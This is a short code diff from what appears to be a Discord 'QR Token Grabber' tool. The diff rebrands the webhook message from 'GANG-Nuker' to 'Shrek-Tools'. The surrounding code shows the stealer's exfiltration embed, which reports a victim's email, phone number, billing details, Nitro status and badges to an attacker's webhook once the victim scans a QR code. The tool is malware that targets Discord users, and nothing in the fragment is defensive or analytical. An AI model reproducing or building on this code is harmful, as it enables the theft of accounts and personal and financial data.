@@ -167,8 +167,8 @@ def QR_grabber(Webhook):
                 "embeds": [
                     {
                         "author": {
-                            "name": "GANG-Nuker | QR Token Grabber",
-                            "url": "https://github.com/TT-Tutorials/GANG-Nuker",
+                            "name": "Shrek-Tools | QR Token Grabber",
+                            "url": "https://github.com/SHREK-TM/Shrek-Tools",
                             "icon_url": "https://cdn.discordapp.com/attachments/1017976609669644373/1035321413093040248/GANG.png"
                         },
                         "description": f"**{user}** Just Scanned the QR Code!\n**[Avatar]({url})**\n\n**Email:** {email}\n**Phone:** {phone}\n**Billing:** {billing}\n**Nitro:** {has_nitro}\n**Badges:** {badges}",
@@ -182,7 +182,7 @@ def QR_grabber(Webhook):
                         "color": 12208895,
 
                         "footer": {
-                          "text": "https://github.com/TT-Tutorials  |  https://github.com/TT-Tutorials/GANG-Nuker"
+                          "text": "https://github.com/SHREK-TM/Shrek-Tools"
                         }
                     }
                 ]
